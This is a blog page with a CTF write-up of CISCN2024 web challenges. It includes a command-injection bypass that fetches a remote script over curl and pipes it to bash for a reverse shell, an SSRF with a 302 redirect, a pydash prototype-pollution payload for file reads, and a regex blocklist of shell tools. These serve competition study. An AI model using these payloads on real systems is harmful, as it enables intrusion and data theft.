@@ -1,0 +1,1053 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>CISCN2024 Web方向题解 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="Web" />
+  
+  <meta name="description" content="被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊()">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2024 Web方向题解">
+<meta property="og:url" content="http://example.com/posts/26055.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊()">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-05-20T05:30:13.000Z">
+<meta property="article:modified_time" content="2024-05-20T14:41:13.142Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/qwq.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/26055.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">CISCN2024 Web方向题解</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-05-20T05:30:13.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-05-20</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~36.15K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/26055.html" class="leancloud_visitors" data-flag-title="CISCN2024 Web方向题解">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1716216073142"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>被CISCN打烂了，几个题都是差一点就出，自己还是太菜了。顺带一提，怎么出题方有srk啊()</p>
+<span id="more"></span>
+<p>私货，不过在misc题里，我赛后才看见</p>
+<img src="/posts/undefined/srkzhenkepa.jpg" class>
+<span class="blur">prprprprprpr斯哈斯哈老公喜加一</span>
+<hr>
+<h1><span id="第一天"> 第一天</span></h1>
+<h2><span id="ezphp"> ezphp</span></h2>
+<p>被这个题卡了好久，搞得我cms没时间交了，把flag放数据库里了，<span class="blur">what</span></p>
+<p>比赛平台不给开环境了。。。。。</p>
+<p>只能凭借记忆来写：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|\*|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125; </span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>有escapeshellcmd</p>
+<p>一个linux命令执行的网页，但是做了很多限制，还有前面的<code>escapeshellcmd</code>，直接禁用各种符号</p>
+<p>搜索escapeshellcmd命令注入可以查到一篇文章，里面讲了一些能够绕过escapeshellcmd的方式，但是需要用到的都被ban了，不过他提供了一个思路</p>
+<p>可以利用参数，比如ls里面的ls -al</p>
+<p>然后找，找到了php，php -i可行，返回了phpinfo</p>
+<p>php -r能够把php代码直接执行，而且由于题目给了<code>escapeshellcmd</code>自动转义，所以我们可以不用加单引号，然后发现反斜杠和反引号可以正常使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r print_r(`l\s`)</span><br></pre></td></tr></table></figure>
+<p>翻遍整个目录都没有找到flag，查看/etc/passwd出现了mysql用户，合理怀疑flag在sql数据库里</p>
+<p>后面反弹shell的流程如下：</p>
+<p><a target="_blank" rel="noopener" href="https://lzltool.cn/Tools/IpToDec">https://lzltool.cn/Tools/IpToDec</a></p>
+<p>将自己的vps ip转成十进制</p>
+<p>然后利用curl，在自己的vps上放一个文件，内容如下：</p>
+<img src="/posts/undefined/1.png" class title="awa">
+<p>靶机：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=php -r <span class="title function_ invoke__">print_r</span>(`c\url\<span class="variable">$IFS</span>\$<span class="number">9</span><span class="attr">http</span>://自己的十进制ip/ttt|bas\h`);</span><br></pre></td></tr></table></figure>
+<p>python起80端口的http server，监听端口</p>
+<p>等shell连过来，mysql登录root root</p>
+<p>构思termius没有连接成功的提示，搞得我还以为卡住了。。。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">www-data@engine-<span class="number">1</span>:/<span class="keyword">var</span>/www/html$ mysql -uroot -p</span><br><span class="line">mysql -uroot -p</span><br><span class="line">Enter password: root</span><br><span class="line">show databases;</span><br><span class="line">a</span><br><span class="line">;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>) at line <span class="number">2</span>: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;<span class="title">a</span>&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br><span class="line"><span class="title">Database</span></span><br><span class="line"><span class="title">PHP_CMS</span></span><br><span class="line"><span class="title">information_schema</span></span><br><span class="line"><span class="title">mysql</span></span><br><span class="line"><span class="title">performance_schema</span></span><br><span class="line"><span class="title">www</span>-<span class="title">data</span>@<span class="title">engine</span>-1:/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>$ <span class="title">mysql</span> -<span class="title">uroot</span> -<span class="title">proot</span></span><br><span class="line"><span class="title">mysql</span> -<span class="title">uroot</span> -<span class="title">proot</span></span><br><span class="line"><span class="title">use</span> <span class="title">PHP_CMS</span>;</span><br><span class="line">show tables;</span><br><span class="line">show columns;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>) at line <span class="number">3</span>: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br><span class="line"><span class="title">Tables_in_PHP_CMS</span></span><br><span class="line"><span class="title">F1ag_Se3Re7</span></span><br><span class="line"><span class="title">www</span>-<span class="title">data</span>@<span class="title">engine</span>-1:/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>$ <span class="title">mysql</span> -<span class="title">uroot</span> -<span class="title">proot</span></span><br><span class="line"><span class="title">mysql</span> -<span class="title">uroot</span> -<span class="title">proot</span></span><br><span class="line"><span class="title">use</span> <span class="title">PHP_CMS</span>;</span><br><span class="line">select * <span class="keyword">from</span> F1ag_Se3Re7</span><br><span class="line">;</span><br><span class="line">a</span><br><span class="line">;</span><br><span class="line">ERROR <span class="number">1064</span> (<span class="number">42000</span>) at line <span class="number">4</span>: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version <span class="keyword">for</span> the right syntax to <span class="keyword">use</span> <span class="title">near</span> &#x27;<span class="title">a</span>&#x27; <span class="title">at</span> <span class="title">line</span> 1</span><br><span class="line"><span class="title">id</span>      <span class="title">f1ag66_2024</span></span><br><span class="line">1       <span class="title">flag</span>&#123;<span class="title">xxxxxxx</span>&#125; </span><br></pre></td></tr></table></figure>
+<h2><span id="ezcms"> ezcms</span></h2>
+<p>这个题，我还以为qrcode处被修复了，所以就审其它地方去了，没想到没有修复，唉</p>
+<p>扫到flag.php，发现需要本地ip访问。提示给出只需要本地访问即可rce，要打ssrf，搜一下这个cms有没有ssrf的洞先</p>
+<p>查找历史漏洞，发现：</p>
+<img src="/posts/undefined/2.png" class title="awa">
+<p>明明上面说被修复了的，为什么实际上还是用这个洞呢</p>
+<p>想了想，哦，他说要开redis服务，那是不是说只修了用ssrf打redis的问题</p>
+<p>看一下最新版的源码逻辑：</p>
+<p>漏洞出现在qrcode，搜索得到：</p>
+<img src="/posts/undefined/3.png" class title="awa">
+<p>在Api.php里，我们需要调用这个函数。先看看哪里能调用curl的函数</p>
+<p>其实在dr_catcher_data里</p>
+<img src="/posts/undefined/4.png" class title="awa">
+<p>这里就直接可以打ssrf，点进去它的逻辑按道理是可以直接127.0.0.1的</p>
+<p>这里的参数是thumb</p>
+<p>怎么调用呢？</p>
+<p>找到一篇文章里面讲了如何调用api：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10002?time__1311=mq%2BxBD97qYqCqAKDsD7me5xrOD87KWqWK4D&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F">某cms 前台RCE漏洞分析 - 先知社区</a></p>
+
+<img src="/posts/undefined/6.png" class title="awa">
+<p>搜索template，发现就在下面</p>
+<img src="/posts/undefined/7.png" class title="awa">
+<p>所以只用这么调用即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/8.png" class title="awa">
+<p>很明显要get传入text和thumb</p>
+<p>thumb是我们你ssrf要打的payload，所以text随便传：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=api&amp;c=api&amp;m=qrcode&amp;text=<span class="number">1</span>&amp;thumb=http:<span class="comment">//127.0.0.1/flag.php</span></span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/9.png" class title="awa">
+<p>但是ip不正确，不能打127.0.0.1</p>
+<p>换个思路，利用302跳转打内网</p>
+<p>起flask服务：</p>
+<img src="/posts/undefined/10.png" class title="awa">
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=curl http:<span class="comment">//vps_ip:port/ttt|bash</span></span><br></pre></td></tr></table></figure>
+<p>python3开启httpserver到port上，打开flask服务，然后将thumb改为我们的http://vps_ip:flask端口上</p>
+<p>然后nc监听另一个端口(需要反弹shell的)</p>
+<img src="/posts/undefined/11.png" class title="awa">
+<h2><span id="sanic复现失败等wp"> sanic(复现失败，等wp)</span></h2>
+<p>给了一个sanic框架的python服务，和flask差不多，但是就是换成了sanic</p>
+<p>访问得到<code>/src</code>里有源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">from</span> sanic_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/src&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">src</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> text(<span class="built_in">open</span>(__file__).read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/admin&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">admin</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.ctx.session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="literal">True</span>:</span><br><span class="line">        key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">        value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">            pollute = Pollute()</span><br><span class="line">            pydash.set_(pollute, key, value)</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>特意标注了pydash的版本是5.1.2，估计漏洞和他有关</p>
+<p>这里搜一下pydash 5.1.2的洞</p>
+<img src="/posts/undefined/12.png" class title="awa">
+<p>还真有，原型链污染，而且出现在<code>pydash.set</code>上，正好我们这里的<code>admin</code>路由就有</p>
+<p>以下是python原型链污染的一些重点关照对象</p>
+<ul>
+<li>函数形参默认值替换：函数的<code>__defaults__</code>和<code>__kwdefaults__</code>这两个内置属性</li>
+<li>os.environ赋值</li>
+<li>flask secret_key修改</li>
+<li>修改当前展示目录或者展示文件（DASCTF修改<code>__file__</code>）</li>
+<li>rce?(自己加的，优先前面三个)</li>
+</ul>
+<p>然后搜索关于pydash的原型链污染，找到了一篇pydash+jinja2的，很接近了，但不是sanic的：</p>
+<p><a target="_blank" rel="noopener" href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">Pydash 原型链污染 (furina.org.cn)</a></p>
+<p>python原型链污染的关键就是要拿到globals，只要找到了<code>__globals__</code>就能找到所有的全局变量和所有的类，进而进行操作</p>
+<p>由于<code>pydash+jinja2</code>这篇的操作是通过jinja2编译模板的时候能够通过污染<code>exported</code>进行命令拼接导致的rce，我就想着<code>sanic</code>是不是也能这样。但是sanic的源码没找到这个方式，所以寄中寄。</p>
+<p>还是老老实实看看能不能读文件吧</p>
+<p>回到这题，这里有2个问题</p>
+<p>第一个问题就是登录页，需要cookie小写后是<code>adm;n</code></p>
+<p>但是我们知道cookie里分号是分隔符，直接读的话n是读不进去的</p>
+<p>所以这里得稍微绕一下，变成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;adm\073n&quot;</span><br></pre></td></tr></table></figure>
+<p>这个双引号也是得加进去的</p>
+<p>所以这个问题便解决了</p>
+<p>然后就是怎么个污染，他把<code>_.</code>给过滤了，这里还是师兄nb，用四个反斜杠就绕过去了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\\\.</span><br></pre></td></tr></table></figure>
+<img src="/posts/undefined/13.png" class title="awa">
+<p>可以看到为true，成功绕过并且触发了pydash的原型链污染</p>
+<p>问题来到如何获取flag。既然rce不了那就只能读文件，先从源码里找能不能得到能够污染的属性</p>
+<p>看源码/src处能够打开file来读，也就是说如果我们能污染<code>__file__</code>，那就能够读任意文件</p>
+<p>获取file的前一步肯定是要获取<code>__globals__</code></p>
+<p>参照pydash+jinja2那篇的payload可以得到获取globals的payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__</span><br></pre></td></tr></table></figure>
+<p>获取到<code>__file__</code>，污染成value，以下为污染成功的结果：</p>
+<img src="/posts/undefined/14.png" class title="awa">
+<p>那接下来读flag，假如flag在根目录且就叫flag，那这题就结束了</p>
+<p>但是并不是，flag不叫flag。接下来我们还得重新找一个方法读flag</p>
+<p>注意到sanic官方文档有一个app.static：</p>
+<img src="/posts/undefined/15.png" class title="awa">
+<p>尝试先污染这个<code>directory_view</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__\\\\.__globals__\\\\.directory_view</span><br></pre></td></tr></table></figure>
+<p>这样直接污染还不行，说明不是读的globals的</p>
+<p>但是本地报错信息给了我们一些提示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">File <span class="string">&quot;D:\Python3.11\Lib\site-packages\sanic\mixins\static.py&quot;</span>, line <span class="number">332</span>, <span class="keyword">in</span> _static_request_handler</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> directory_handler.handle(request, request.path)</span><br></pre></td></tr></table></figure>
+<p>可以看到关于app.static的源码存在这个static.py里，去github找一下，也可以在本地找，找到参数如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Args:</span><br><span class="line">           uri (str): URL path to be used for serving static content.</span><br><span class="line">           file_or_directory (Union[PathLike, str]): Path to the static file</span><br><span class="line">               or directory with static files.</span><br><span class="line">           pattern (str, optional): Regex pattern identifying the valid</span><br><span class="line">               static files. Defaults to `r&quot;/?.+&quot;`.</span><br><span class="line">           use_modified_since (bool, optional): If true, send file modified</span><br><span class="line">               time, and return not modified if the browser&#x27;s matches the</span><br><span class="line">               server&#x27;s. Defaults to `True`.</span><br><span class="line">           use_content_range (bool, optional): If true, process header for</span><br><span class="line">               range requests and sends  the file part that is requested.</span><br><span class="line">               Defaults to `False`.</span><br><span class="line">           stream_large_files (Union[bool, int], optional): If `True`, use</span><br><span class="line">               the `StreamingHTTPResponse.file_stream` handler rather than</span><br><span class="line">               the `HTTPResponse.file handler` to send the file. If this</span><br><span class="line">               is an integer, it represents the threshold size to switch</span><br><span class="line">               to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span><br><span class="line">               which means that the response will not be streamed.</span><br><span class="line">           name (str, optional): User-defined name used for url_for.</span><br><span class="line">               Defaults to `&quot;static&quot;`.</span><br><span class="line">           host (Optional[str], optional): Host IP or FQDN for the</span><br><span class="line">               service to use.</span><br><span class="line">           strict_slashes (Optional[bool], optional): Instruct Sanic to</span><br><span class="line">               check if the request URLs need to terminate with a slash.</span><br><span class="line">           content_type (Optional[str], optional): User-defined content type</span><br><span class="line">               for header.</span><br><span class="line">           apply (bool, optional): If true, will register the route</span><br><span class="line">               immediately. Defaults to `True`.</span><br><span class="line">           resource_type (Optional[str], optional): Explicitly declare a</span><br><span class="line">               resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span><br><span class="line">           index (Optional[Union[str, Sequence[str]]], optional): When</span><br><span class="line">               exposing against a directory, index is  the name that will</span><br><span class="line">               be served as the default file. When multiple file names are</span><br><span class="line">               passed, then they will be tried in order.</span><br><span class="line">           directory_view (bool, optional): Whether to fallback to showing</span><br><span class="line">               the directory viewer when exposing a directory. Defaults</span><br><span class="line">               to `False`.</span><br><span class="line">           directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class="line">               instance of DirectoryHandler that can be used for explicitly</span><br><span class="line">               controlling and subclassing the behavior of the default</span><br><span class="line">               directory handler.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>找几个有用的</p>
+<ul>
+<li>uri，也就是第一个参数，静态文件在网页存放的目录</li>
+<li>file_or_directory，也就是第二个参数，静态文件在本地存放的目录</li>
+<li>directory_view，开启页面展示</li>
+</ul>
+<p>找到这几个参数，那得看看怎么打开，首先要获得这个static</p>
+<p>等正式wp再看看</p>
+<h1><span id="第二天"> 第二天</span></h1>
+<h2><span id="cms_revenge"> cms_revenge</span></h2>
+<p>把qrcode给修了，但没完全修复，只加了文件头检验，在302跳转的文件加个GIF89a即可：</p>
